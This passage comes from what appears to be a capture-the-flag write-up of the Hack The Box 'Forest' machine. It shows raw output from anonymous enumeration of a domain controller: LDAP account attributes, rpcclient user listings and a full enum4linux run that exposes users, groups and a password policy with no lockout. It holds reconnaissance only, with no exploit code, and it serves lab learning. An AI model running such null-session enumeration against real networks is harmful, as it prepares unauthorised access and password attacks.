+mailNickname: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042
+distinguishedName: CN=SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201},CN=U
+displayName: E4E Encryption Store - Active
+name: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}
+badPwdCount: 0
+pwdLastSet: 0
+sAMAccountName: SM_7c96b981967141ebb
+userPrincipalName: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@htb.loc
+msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (
+msExchUMDtmfMap: lastNameFirstName:7978366245269303409202392472092332228692032
+msExchUMDtmfMap: firstNameLastName:7978366245269303409202392472092332228692032
+mailNickname: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}
+distinguishedName: CN=SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA},CN=U
+displayName: Microsoft Exchange
+name: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}
+badPwdCount: 0
+pwdLastSet: 0
+sAMAccountName: SM_c75ee099d0a64c91b
+userPrincipalName: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}@htb.loc
+msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (
+msExchUMDtmfMap: lastNameFirstName:7978366245269223344053123455389372727327203
+msExchUMDtmfMap: firstNameLastName:7978366245269223344053123455389372727327203
+mailNickname: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}
+distinguishedName: CN=SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9},CN=U
+displayName: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}
+name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}
+badPwdCount: 0
+pwdLastSet: 0
+sAMAccountName: SM_1ffab36a2f5f479cb
+userPrincipalName: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}@htb.loc
+msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (
+msExchUMDtmfMap: lastNameFirstName:7978366245269822370338222422829262294230641
+msExchUMDtmfMap: firstNameLastName:7978366245269822370338222422829262294230641
+mailNickname: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}
+distinguishedName: CN=Guest,CN=Users,DC=htb,DC=local
+name: Guest
+badPwdCount: 0
+pwdLastSet: 0
+sAMAccountName: Guest
+distinguishedName: CN=DefaultAccount,CN=Users,DC=htb,DC=local
+name: DefaultAccount
+badPwdCount: 0
+pwdLastSet: 0
+sAMAccountName: DefaultAccount
+distinguishedName: CN=Domain Computers,CN=Users,DC=htb,DC=local
+name: Domain Computers
+sAMAccountName: Domain Computers
+distinguishedName: CN=Cert Publishers,CN=Users,DC=htb,DC=local
+name: Cert Publishers
+sAMAccountName: Cert Publishers
+distinguishedName: CN=Domain Users,CN=Users,DC=htb,DC=local
+name: Domain Users
+sAMAccountName: Domain Users
+distinguishedName: CN=Domain Guests,CN=Users,DC=htb,DC=local
+name: Domain Guests
+sAMAccountName: Domain Guests
+distinguishedName: CN=Group Policy Creator Owners,CN=Users,DC=htb,DC=local
+name: Group Policy Creator Owners
+sAMAccountName: Group Policy Creator Owners
+distinguishedName: CN=RAS and IAS Servers,CN=Users,DC=htb,DC=local
+name: RAS and IAS Servers
+sAMAccountName: RAS and IAS Servers
+</code></pre><h2 id="191d1b9f-8847-812a-8abd-c0d21e0d929a" class="">RPC</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="191d1b9f-8847-81ae-a0ab-fb9d24cc497a" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Forest]
+└─$ rpcclient -U &quot;&quot; -N 10.10.10.161
+rpcclient $&gt; querydispinfo
+index: 0x2137 RID: 0x463 acb: 0x00020015 Account: $331000-VK4ADACQNUCA	Name: (null)	Desc: (null)
+index: 0xfbc RID: 0x1f4 acb: 0x00000010 Account: Administrator	Name: Administrator	Desc: Built-in account for administering the computer/domain
+index: 0x2369 RID: 0x47e acb: 0x00000210 Account: andy	Name: Andy Hislip	Desc: (null)
+index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount	Name: (null)	Desc: A user account managed by the system.
+index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
+index: 0x2352 RID: 0x478 acb: 0x00000210 Account: HealthMailbox0659cc1	Name: HealthMailbox-EXCH01-010	Desc: (null)
+index: 0x234b RID: 0x471 acb: 0x00000210 Account: HealthMailbox670628e	Name: HealthMailbox-EXCH01-003	Desc: (null)
+index: 0x234d RID: 0x473 acb: 0x00000210 Account: HealthMailbox6ded678	Name: HealthMailbox-EXCH01-005	Desc: (null)
+index: 0x2351 RID: 0x477 acb: 0x00000210 Account: HealthMailbox7108a4e	Name: HealthMailbox-EXCH01-009	Desc: (null)
+index: 0x234e RID: 0x474 acb: 0x00000210 Account: HealthMailbox83d6781	Name: HealthMailbox-EXCH01-006	Desc: (null)
+index: 0x234c RID: 0x472 acb: 0x00000210 Account: HealthMailbox968e74d	Name: HealthMailbox-EXCH01-004	Desc: (null)
+index: 0x2350 RID: 0x476 acb: 0x00000210 Account: HealthMailboxb01ac64	Name: HealthMailbox-EXCH01-008	Desc: (null)
+index: 0x234a RID: 0x470 acb: 0x00000210 Account: HealthMailboxc0a90c9	Name: HealthMailbox-EXCH01-002	Desc: (null)
+index: 0x2348 RID: 0x46e acb: 0x00000210 Account: HealthMailboxc3d7722	Name: HealthMailbox-EXCH01-Mailbox-Database-1118319013	Desc: (null)
+index: 0x2349 RID: 0x46f acb: 0x00000210 Account: HealthMailboxfc9daad	Name: HealthMailbox-EXCH01-001	Desc: (null)
+index: 0x234f RID: 0x475 acb: 0x00000210 Account: HealthMailboxfd87238	Name: HealthMailbox-EXCH01-007	Desc: (null)
+index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
+index: 0x2360 RID: 0x47a acb: 0x00000210 Account: lucinda	Name: Lucinda Berger	Desc: (null)
+index: 0x236a RID: 0x47f acb: 0x00000210 Account: mark	Name: Mark Brandt	Desc: (null)
+index: 0x236b RID: 0x480 acb: 0x00000210 Account: santi	Name: Santi Rodriguez	Desc: (null)
+index: 0x235c RID: 0x479 acb: 0x00000210 Account: sebastien	Name: Sebastien Caron	Desc: (null)
+index: 0x215a RID: 0x468 acb: 0x00020011 Account: SM_1b41c9286325456bb	Name: Microsoft Exchange Migration	Desc: (null)
+index: 0x2161 RID: 0x46c acb: 0x00020011 Account: SM_1ffab36a2f5f479cb	Name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}	Desc: (null)
+index: 0x2156 RID: 0x464 acb: 0x00020011 Account: SM_2c8eef0a09b545acb	Name: Microsoft Exchange Approval Assistant	Desc: (null)
+index: 0x2159 RID: 0x467 acb: 0x00020011 Account: SM_681f53d4942840e18	Name: Discovery Search Mailbox	Desc: (null)
+index: 0x2158 RID: 0x466 acb: 0x00020011 Account: SM_75a538d3025e4db9a	Name: Microsoft Exchange	Desc: (null)
+index: 0x215c RID: 0x46a acb: 0x00020011 Account: SM_7c96b981967141ebb	Name: E4E Encryption Store - Active	Desc: (null)
+index: 0x215b RID: 0x469 acb: 0x00020011 Account: SM_9b69f1b9d2cc45549	Name: Microsoft Exchange Federation Mailbox	Desc: (null)
+index: 0x215d RID: 0x46b acb: 0x00020011 Account: SM_c75ee099d0a64c91b	Name: Microsoft Exchange	Desc: (null)
+index: 0x2157 RID: 0x465 acb: 0x00020011 Account: SM_ca8c2ed5bdab4dc9b	Name: Microsoft Exchange	Desc: (null)
+index: 0x2365 RID: 0x47b acb: 0x00010210 Account: svc-alfresco	Name: svc-alfresco	Desc: (null)
+rpcclient $&gt; enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[$331000-VK4ADACQNUCA] rid:[0x463]
+user:[SM_2c8eef0a09b545acb] rid:[0x464]
+user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
+user:[SM_75a538d3025e4db9a] rid:[0x466]
+user:[SM_681f53d4942840e18] rid:[0x467]
+user:[SM_1b41c9286325456bb] rid:[0x468]
+user:[SM_9b69f1b9d2cc45549] rid:[0x469]
+user:[SM_7c96b981967141ebb] rid:[0x46a]
+user:[SM_c75ee099d0a64c91b] rid:[0x46b]
+user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
+user:[HealthMailboxc3d7722] rid:[0x46e]
+user:[HealthMailboxfc9daad] rid:[0x46f]
+user:[HealthMailboxc0a90c9] rid:[0x470]
+user:[HealthMailbox670628e] rid:[0x471]
+user:[HealthMailbox968e74d] rid:[0x472]
+user:[HealthMailbox6ded678] rid:[0x473]
+user:[HealthMailbox83d6781] rid:[0x474]
+user:[HealthMailboxfd87238] rid:[0x475]
+user:[HealthMailboxb01ac64] rid:[0x476]
+user:[HealthMailbox7108a4e] rid:[0x477]
+user:[HealthMailbox0659cc1] rid:[0x478]
+user:[sebastien] rid:[0x479]
+user:[lucinda] rid:[0x47a]
+user:[svc-alfresco] rid:[0x47b]
+user:[andy] rid:[0x47e]
+user:[mark] rid:[0x47f]
+user:[santi] rid:[0x480]
+</code></pre><h3 id="195d1b9f-8847-806c-bb29-d1d31e7154c5" class="">RPC resume</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="195d1b9f-8847-80b3-a716-e38dd34c1e2c" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">Account: lucinda	Name: Lucinda Berger	Desc: (null)
+Account: mark	Name: Mark Brandt	Desc: (null)
+Account: santi	Name: Santi Rodriguez	Desc: (null)
+Account: sebastien	Name: Sebastien Caron	Desc: (null)
+Account: svc-alfresco	Name: svc-alfresco	Desc: (null)
+Account: $331000-VK4ADACQNUCA	Name: (null)	Desc: (null)
+Account: andy	Name: Andy Hislip	Desc: (null)
+user:[$331000-VK4ADACQNUCA] rid:[0x463]
+user:[sebastien] rid:[0x479]
+user:[lucinda] rid:[0x47a]
+user:[svc-alfresco] rid:[0x47b]
+user:[andy] rid:[0x47e]
+user:[mark] rid:[0x47f]
+user:[santi] rid:[0x480]
+</code></pre><h2 id="191d1b9f-8847-814f-9858-c94e9d1e45e4" class="">SMB Enumeration → 445 port</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="191d1b9f-8847-8187-9562-ce7b495d8392" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Forest]
+└─$ enum4linux -a 10.10.10.161
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Feb  8 20:38:59 2025
+
+ =========================================( Target Information )=========================================
+
+Target ........... 10.10.10.161
+RID Range ........ 500-550,1000-1050
+Username ......... &#x27;&#x27;
+Password ......... &#x27;&#x27;
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ============================( Enumerating Workgroup/Domain on 10.10.10.161 )============================
+
+
+[E] Can&#x27;t find workgroup/domain
+
+
+
+ ================================( Nbtstat Information for 10.10.10.161 )================================
+
+Looking up status of 10.10.10.161
+No reply from 10.10.10.161
+
+ ===================================( Session Check on 10.10.10.161 )===================================
+
+
+[+] Server 10.10.10.161 allows sessions using username &#x27;&#x27;, password &#x27;&#x27;
+
+
+ ================================( Getting domain SID for 10.10.10.161 )================================
+
+Domain Name: HTB
+Domain Sid: S-1-5-21-3072663084-364016917-1341370565
+
+[+] Host is part of a domain (not a workgroup)
+
+
+ ===================================( OS information on 10.10.10.161 )===================================
+
+
+[E] Can&#x27;t get OS info with smbclient
+
+
+[+] Got OS info for 10.10.10.161 from srvinfo: 
+do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
+
+
+ =======================================( Users on 10.10.10.161 )=======================================
+
+index: 0x2137 RID: 0x463 acb: 0x00020015 Account: $331000-VK4ADACQNUCA	Name: (null)	Desc: (null)
+index: 0xfbc RID: 0x1f4 acb: 0x00000010 Account: Administrator	Name: Administrator	Desc: Built-in account for administering the computer/domain
+index: 0x2369 RID: 0x47e acb: 0x00000210 Account: andy	Name: Andy Hislip	Desc: (null)
+index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount	Name: (null)	Desc: A user account managed by the system.
+index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
+index: 0x2352 RID: 0x478 acb: 0x00000210 Account: HealthMailbox0659cc1	Name: HealthMailbox-EXCH01-010	Desc: (null)
+index: 0x234b RID: 0x471 acb: 0x00000210 Account: HealthMailbox670628e	Name: HealthMailbox-EXCH01-003	Desc: (null)
+index: 0x234d RID: 0x473 acb: 0x00000210 Account: HealthMailbox6ded678	Name: HealthMailbox-EXCH01-005	Desc: (null)
+index: 0x2351 RID: 0x477 acb: 0x00000210 Account: HealthMailbox7108a4e	Name: HealthMailbox-EXCH01-009	Desc: (null)
+index: 0x234e RID: 0x474 acb: 0x00000210 Account: HealthMailbox83d6781	Name: HealthMailbox-EXCH01-006	Desc: (null)
+index: 0x234c RID: 0x472 acb: 0x00000210 Account: HealthMailbox968e74d	Name: HealthMailbox-EXCH01-004	Desc: (null)
+index: 0x2350 RID: 0x476 acb: 0x00000210 Account: HealthMailboxb01ac64	Name: HealthMailbox-EXCH01-008	Desc: (null)
+index: 0x234a RID: 0x470 acb: 0x00000210 Account: HealthMailboxc0a90c9	Name: HealthMailbox-EXCH01-002	Desc: (null)
+index: 0x2348 RID: 0x46e acb: 0x00000210 Account: HealthMailboxc3d7722	Name: HealthMailbox-EXCH01-Mailbox-Database-1118319013	Desc: (null)
+index: 0x2349 RID: 0x46f acb: 0x00000210 Account: HealthMailboxfc9daad	Name: HealthMailbox-EXCH01-001	Desc: (null)
+index: 0x234f RID: 0x475 acb: 0x00000210 Account: HealthMailboxfd87238	Name: HealthMailbox-EXCH01-007	Desc: (null)
+index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
+index: 0x2360 RID: 0x47a acb: 0x00000210 Account: lucinda	Name: Lucinda Berger	Desc: (null)
+index: 0x236a RID: 0x47f acb: 0x00000210 Account: mark	Name: Mark Brandt	Desc: (null)
+index: 0x236b RID: 0x480 acb: 0x00000210 Account: santi	Name: Santi Rodriguez	Desc: (null)
+index: 0x235c RID: 0x479 acb: 0x00000210 Account: sebastien	Name: Sebastien Caron	Desc: (null)
+index: 0x215a RID: 0x468 acb: 0x00020011 Account: SM_1b41c9286325456bb	Name: Microsoft Exchange Migration	Desc: (null)
+index: 0x2161 RID: 0x46c acb: 0x00020011 Account: SM_1ffab36a2f5f479cb	Name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}	Desc: (null)
+index: 0x2156 RID: 0x464 acb: 0x00020011 Account: SM_2c8eef0a09b545acb	Name: Microsoft Exchange Approval Assistant	Desc: (null)
+index: 0x2159 RID: 0x467 acb: 0x00020011 Account: SM_681f53d4942840e18	Name: Discovery Search Mailbox	Desc: (null)
+index: 0x2158 RID: 0x466 acb: 0x00020011 Account: SM_75a538d3025e4db9a	Name: Microsoft Exchange	Desc: (null)
+index: 0x215c RID: 0x46a acb: 0x00020011 Account: SM_7c96b981967141ebb	Name: E4E Encryption Store - Active	Desc: (null)
+index: 0x215b RID: 0x469 acb: 0x00020011 Account: SM_9b69f1b9d2cc45549	Name: Microsoft Exchange Federation Mailbox	Desc: (null)
+index: 0x215d RID: 0x46b acb: 0x00020011 Account: SM_c75ee099d0a64c91b	Name: Microsoft Exchange	Desc: (null)
+index: 0x2157 RID: 0x465 acb: 0x00020011 Account: SM_ca8c2ed5bdab4dc9b	Name: Microsoft Exchange	Desc: (null)
+index: 0x2365 RID: 0x47b acb: 0x00010210 Account: svc-alfresco	Name: svc-alfresco	Desc: (null)
+
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[$331000-VK4ADACQNUCA] rid:[0x463]
+user:[SM_2c8eef0a09b545acb] rid:[0x464]
+user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
+user:[SM_75a538d3025e4db9a] rid:[0x466]
+user:[SM_681f53d4942840e18] rid:[0x467]
+user:[SM_1b41c9286325456bb] rid:[0x468]
+user:[SM_9b69f1b9d2cc45549] rid:[0x469]
+user:[SM_7c96b981967141ebb] rid:[0x46a]
+user:[SM_c75ee099d0a64c91b] rid:[0x46b]
+user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
+user:[HealthMailboxc3d7722] rid:[0x46e]
+user:[HealthMailboxfc9daad] rid:[0x46f]
+user:[HealthMailboxc0a90c9] rid:[0x470]
+user:[HealthMailbox670628e] rid:[0x471]
+user:[HealthMailbox968e74d] rid:[0x472]
+user:[HealthMailbox6ded678] rid:[0x473]
+user:[HealthMailbox83d6781] rid:[0x474]
+user:[HealthMailboxfd87238] rid:[0x475]
+user:[HealthMailboxb01ac64] rid:[0x476]
+user:[HealthMailbox7108a4e] rid:[0x477]
+user:[HealthMailbox0659cc1] rid:[0x478]
+user:[sebastien] rid:[0x479]
+user:[lucinda] rid:[0x47a]
+user:[svc-alfresco] rid:[0x47b]
+user:[andy] rid:[0x47e]
+user:[mark] rid:[0x47f]
+user:[santi] rid:[0x480]
+
+ =================================( Share Enumeration on 10.10.10.161 )=================================
+
+do_connect: Connection to 10.10.10.161 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+
+	Sharename       Type      Comment
+	---------       ----      -------
+Reconnecting with SMB1 for workgroup listing.
+Unable to connect with SMB1 -- no workgroup available
+
+[+] Attempting to map shares on 10.10.10.161
+
+
+ ============================( Password Policy Information for 10.10.10.161 )============================
+
+
+
+[+] Attaching to 10.10.10.161 using a NULL share
+
+[+] Trying protocol 139/SMB...
+
+	[!] Protocol failed: Cannot request session (Called Name:10.10.10.161)
+
+[+] Trying protocol 445/SMB...
+
+[+] Found domain(s):
+
+	[+] HTB
+	[+] Builtin
+
+[+] Password Info for Domain: HTB
+
+	[+] Minimum password length: 7
+	[+] Password history length: 24
+	[+] Maximum password age: Not Set
+	[+] Password Complexity Flags: 000000
+
+		[+] Domain Refuse Password Change: 0
+		[+] Domain Password Store Cleartext: 0
+		[+] Domain Password Lockout Admins: 0
+		[+] Domain Password No Clear Change: 0
+		[+] Domain Password No Anon Change: 0
+		[+] Domain Password Complex: 0
+
+	[+] Minimum password age: 1 day 4 minutes 
+	[+] Reset Account Lockout Counter: 30 minutes 
+	[+] Locked Account Duration: 30 minutes 
+	[+] Account Lockout Threshold: None
+	[+] Forced Log off Time: Not Set
+
+
+
+[+] Retieved partial password policy with rpcclient:
+
+
+Password Complexity: Disabled
+Minimum Password Length: 7
+
+
+ =======================================( Groups on 10.10.10.161 )=======================================
+
+
+[+] Getting builtin groups:
+
+group:[Account Operators] rid:[0x224]
+group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
+group:[Incoming Forest Trust Builders] rid:[0x22d]
+group:[Windows Authorization Access Group] rid:[0x230]
+group:[Terminal Server License Servers] rid:[0x231]
+group:[Administrators] rid:[0x220]
+group:[Users] rid:[0x221]
+group:[Guests] rid:[0x222]
+group:[Print Operators] rid:[0x226]
+group:[Backup Operators] rid:[0x227]
+group:[Replicator] rid:[0x228]
+group:[Remote Desktop Users] rid:[0x22b]
+group:[Network Configuration Operators] rid:[0x22c]
+group:[Performance Monitor Users] rid:[0x22e]
+group:[Performance Log Users] rid:[0x22f]
+group:[Distributed COM Users] rid:[0x232]
+group:[IIS_IUSRS] rid:[0x238]
+group:[Cryptographic Operators] rid:[0x239]
+group:[Event Log Readers] rid:[0x23d]
+group:[Certificate Service DCOM Access] rid:[0x23e]
+group:[RDS Remote Access Servers] rid:[0x23f]
+group:[RDS Endpoint Servers] rid:[0x240]
+group:[RDS Management Servers] rid:[0x241]
+group:[Hyper-V Administrators] rid:[0x242]
+group:[Access Control Assistance Operators] rid:[0x243]
+group:[Remote Management Users] rid:[0x244]
+group:[System Managed Accounts Group] rid:[0x245]
+group:[Storage Replica Administrators] rid:[0x246]
+group:[Server Operators] rid:[0x225]
+
+[+]  Getting builtin group memberships:
+
+Group: Windows Authorization Access Group&#x27; (RID: 560) has member: Couldn&#x27;t lookup SIDs
+Group: Administrators&#x27; (RID: 544) has member: Couldn&#x27;t lookup SIDs
+Group: Remote Management Users&#x27; (RID: 580) has member: Couldn&#x27;t lookup SIDs
+Group: Guests&#x27; (RID: 546) has member: Couldn&#x27;t lookup SIDs
+Group: System Managed Accounts Group&#x27; (RID: 581) has member: Couldn&#x27;t lookup SIDs
+Group: Account Operators&#x27; (RID: 548) has member: Couldn&#x27;t lookup SIDs
+Group: IIS_IUSRS&#x27; (RID: 568) has member: Couldn&#x27;t lookup SIDs
+Group: Pre-Windows 2000 Compatible Access&#x27; (RID: 554) has member: Couldn&#x27;t lookup SIDs
+Group: Users&#x27; (RID: 545) has member: Couldn&#x27;t lookup SIDs
+
+[+]  Getting local groups:
+
+group:[Cert Publishers] rid:[0x205]
+group:[RAS and IAS Servers] rid:[0x229]
+group:[Allowed RODC Password Replication Group] rid:[0x23b]
+group:[Denied RODC Password Replication Group] rid:[0x23c]
+group:[DnsAdmins] rid:[0x44d]
+
+[+]  Getting local group memberships:
+
+Group: Denied RODC Password Replication Group&#x27; (RID: 572) has member: Couldn&#x27;t lookup SIDs
+
+[+]  Getting domain groups:
+
+group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
+group:[Domain Admins] rid:[0x200]
+group:[Domain Users] rid:[0x201]
+group:[Domain Guests] rid:[0x202]
+group:[Domain Computers] rid:[0x203]
+group:[Domain Controllers] rid:[0x204]
+group:[Schema Admins] rid:[0x206]
+group:[Enterprise Admins] rid:[0x207]
+group:[Group Policy Creator Owners] rid:[0x208]
+group:[Read-only Domain Controllers] rid:[0x209]
+group:[Cloneable Domain Controllers] rid:[0x20a]
+group:[Protected Users] rid:[0x20d]
+group:[Key Admins] rid:[0x20e]
+group:[Enterprise Key Admins] rid:[0x20f]
+group:[DnsUpdateProxy] rid:[0x44e]
+group:[Organization Management] rid:[0x450]
+group:[Recipient Management] rid:[0x451]
+group:[View-Only Organization Management] rid:[0x452]
+group:[Public Folder Management] rid:[0x453]
+group:[UM Management] rid:[0x454]
+group:[Help Desk] rid:[0x455]
+group:[Records Management] rid:[0x456]
+group:[Discovery Management] rid:[0x457]
+group:[Server Management] rid:[0x458]
+group:[Delegated Setup] rid:[0x459]
+group:[Hygiene Management] rid:[0x45a]
+group:[Compliance Management] rid:[0x45b]
+group:[Security Reader] rid:[0x45c]
+group:[Security Administrator] rid:[0x45d]
+group:[Exchange Servers] rid:[0x45e]
+group:[Exchange Trusted Subsystem] rid:[0x45f]
+group:[Managed Availability Servers] rid:[0x460]
+group:[Exchange Windows Permissions] rid:[0x461]
+group:[ExchangeLegacyInterop] rid:[0x462]
+group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
+group:[Service Accounts] rid:[0x47c]
+group:[Privileged IT Accounts] rid:[0x47d]
+group:[test] rid:[0x13ed]
+
+[+]  Getting domain group memberships:
+
+Group: &#x27;Exchange Windows Permissions&#x27; (RID: 1121) has member: HTB\Exchange Trusted Subsystem
+Group: &#x27;Domain Admins&#x27; (RID: 512) has member: HTB\Administrator
+Group: &#x27;Service Accounts&#x27; (RID: 1148) has member: HTB\svc-alfresco
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: HTB\Administrator
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: HTB\DefaultAccount
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: HTB\krbtgt
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: HTB\$331000-VK4ADACQNUCA
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: HTB\SM_2c8eef0a09b545acb
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: HTB\SM_ca8c2ed5bdab4dc9b
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: HTB\SM_75a538d3025e4db9a
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: HTB\SM_681f53d4942840e18
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: HTB\SM_1b41c9286325456bb
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: HTB\SM_9b69f1b9d2cc45549
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: HTB\SM_7c96b981967141ebb
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: HTB\SM_c75ee099d0a64c91b
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: HTB\SM_1ffab36a2f5f479cb
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: HTB\HealthMailboxc3d7722
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: HTB\HealthMailboxfc9daad
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: HTB\HealthMailboxc0a90c9
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: HTB\HealthMailbox670628e
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: HTB\HealthMailbox968e74d
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: HTB\HealthMailbox6ded678
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: HTB\HealthMailbox83d6781
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: HTB\HealthMailboxfd87238
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: HTB\HealthMailboxb01ac64
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: HTB\HealthMailbox7108a4e
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: HTB\HealthMailbox0659cc1
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: HTB\sebastien
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: HTB\lucinda
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: HTB\svc-alfresco
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: HTB\andy
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: HTB\mark
+Group: &#x27;Domain Users&#x27; (RID: 513) has member: HTB\santi
+Group: &#x27;Organization Management&#x27; (RID: 1104) has member: HTB\Administrator
+Group: &#x27;Privileged IT Accounts&#x27; (RID: 1149) has member: HTB\Service Accounts
+Group: &#x27;Exchange Servers&#x27; (RID: 1118) has member: HTB\EXCH01$
+Group: &#x27;Exchange Servers&#x27; (RID: 1118) has member: HTB\$D31000-NSEL5BRJ63V7
+Group: &#x27;Managed Availability Servers&#x27; (RID: 1120) has member: HTB\EXCH01$
+Group: &#x27;Managed Availability Servers&#x27; (RID: 1120) has member: HTB\Exchange Servers
+Group: &#x27;Domain Controllers&#x27; (RID: 516) has member: HTB\FOREST$
+Group: &#x27;Domain Guests&#x27; (RID: 514) has member: HTB\Guest
+Group: &#x27;Group Policy Creator Owners&#x27; (RID: 520) has member: HTB\Administrator
+Group: &#x27;Domain Computers&#x27; (RID: 515) has member: HTB\EXCH01$
+Group: &#x27;Enterprise Admins&#x27; (RID: 519) has member: HTB\Administrator
+Group: &#x27;$D31000-NSEL5BRJ63V7&#x27; (RID: 1133) has member: HTB\EXCH01$
+Group: &#x27;Schema Admins&#x27; (RID: 518) has member: HTB\Administrator
+Group: &#x27;Exchange Trusted Subsystem&#x27; (RID: 1119) has member: HTB\EXCH01$
+
+ ==================( Users on 10.10.10.161 via RID cycling (RIDS: 500-550,1000-1050) )==================
+
+
